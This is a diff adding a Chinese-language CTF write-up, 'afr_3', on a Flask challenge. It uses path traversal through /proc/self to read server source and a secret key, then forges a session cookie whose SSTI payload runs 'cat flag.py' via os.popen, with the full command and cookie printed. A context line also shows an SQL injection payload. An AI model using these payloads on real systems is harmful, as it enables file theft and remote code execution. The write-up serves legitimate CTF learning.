@@ -117,3 +117,97 @@ name=test' and (updatexml('anything',concat('~',(selselectect flag from fl4g)),'
 判断可能存在目录穿透，尝试访问`/img../`,得到FLAG
 ![](pic/afr2_3.png)
 
+## afr_3
+
+通过URL 观察得知存在文件读取，输入flag，显示无权限：
+![](pic/afr3_1.png)
+
+应该是有过滤或其他WAF需要绕过，随便输入一个文件名，发现报错信息会暴露服务器文件路径：
+
+![](pic/afr3_2.png)
+
+尝试cmdline(`?name=../../../../proc/self/cmdline`),发现存在python文件执行:
+![](pic/afr3_3.png)
+
+访问`name=./../../../proc/self/cwd/server.py`得到python源码：
+![](pic/afr3_4.png)
+整理后如下：
+```python
+#!/usr/bin/python
+import os
+from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string )
+from flask_session import Session
+
+app = Flask(__name__)
+execfile('flag.py')
+execfile('key.py')
+
+FLAG = flag
+app.secret_key = key
+@app.route("/n1page", methods=["GET", "POST"])
+def n1page():
+    if request.method != "POST":
+        return redirect(url_for("index"))
+    n1code = request.form.get("n1code") or None
+    if n1code is not None:
+        n1code = n1code.replace(".", "").replace("_", "").replace("{","").replace("}","")
+    if "n1code" not in session or session['n1code'] is None:
+        session['n1code'] = n1code
+    template = None
+    if session['n1code'] is not None:
+        template = '''<h1>N1 Page</h1> <div class="row> <div class="col-md-6 col-md-offset-3 center"> Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>? </div> </div> ''' % session['n1code']
+        session['n1code'] = None
+    return render_template_string(template)
+
+@app.route("/", methods=["GET"])
+def index():
+    return render_template("main.html")
+@app.route('/article', methods=['GET'])
+def article():
+    error = 0
+    if 'name' in request.args:
+        page = request.args.get('name')
+    else:
+        page = 'article'
+    if page.find('flag')>=0:
+        page = 'notallowed.txt'
+    try:
+        template = open('/home/nu11111111l/articles/{}'.format(page)).read()
+    except Exception as e:
+        template = e
+
+    return render_template('article.html', template=template)
+
+  if __name__ == "__main__":
+    app.run(host='0.0.0.0', debug=False)
+
+```
+审计后可以发现：
+-  `flag`被过滤: ```if page.find('flag')>=0:  page = 'notallowed.txt' ```
+-  此处代码将SEESION中的值直接拼接到template中，且使用`render_template_string`进行渲染和输出，存在`SSTI`:
+```python
+    if session['n1code'] is not None:
+         template = '''<h1>N1 Page</h1> <div class="row>
+          <div class="col-md-6 col-md-offset-3 center"> Hello : %s, 
+          why you don't look at our <a href='/article?name=article'>article</a>
+          ? </div> </div> ''' % session['n1code'] 
+          session['n1code'] = None 
+   return render_template_string(template)
+```
+- `appkey`在`key.py`中: `?name=./../../../proc/self/cwd/key.py`
+![](pic/afr3_5.png)
+`Drmhze6EPcv0fN_81Bj-nA`
+
+那么利用flask `SSTI`  进行cookie伪造达到注入：
+- 使用工具[flask_session_cookie_manager](https://noraj.github.io/flask-session-cookie-manager/) 得到伪造的cookie：
+```cmd
+python flask_session_cookie_manager3.py  encode -s "Drmhze6EPcv0fN_81Bj-nA" -t "{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'}"
+
+.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.Yb7zyg.oiV-yqeTY7xhwj5Nr0eSQ8vmp8o
+``` 
+- 抓包进行注入：
+![](pic/afr3_7.png)
+
+
+漏洞利用详解[python-flask-ssti(模版注入漏洞)](https://www.cnblogs.com/hackxf/p/10480071.html)
+
